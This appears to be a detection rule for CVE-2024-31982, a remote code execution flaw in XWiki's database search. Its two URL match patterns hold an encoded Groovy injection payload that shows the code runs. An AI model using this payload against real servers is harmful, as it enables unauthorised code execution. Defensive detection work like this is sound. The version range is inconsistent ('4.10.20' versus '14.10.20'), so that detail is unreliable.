id: CVE-2024-31982
info:
  classification: CVE-2024-31982
  description: 'XWiki Platform is a generic wiki platform. Starting in version 2.4-milestone-1
    and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, XWiki''s database search
    allows remote code execution through the search text. This allows remote code
    execution for any visitor of a public wiki or user of a closed wiki as the database
    search is by default accessible for all users. This impacts the confidentiality,
    integrity and availability of the whole XWiki installation. This vulnerability
    has been patched in XWiki 14.10.20, 15.5.4 and 15.10RC1. As a workaround, one
    may manually apply the patch to the page `Main.DatabaseSearch`. Alternatively,
    unless database search is explicitly used by users, this page can be deleted as
    this is not the default search interface of XWiki.

    '
  name: CVE-2024-31982
  severity: critical
request:
  url:
  - match: /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
  - match: /bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20
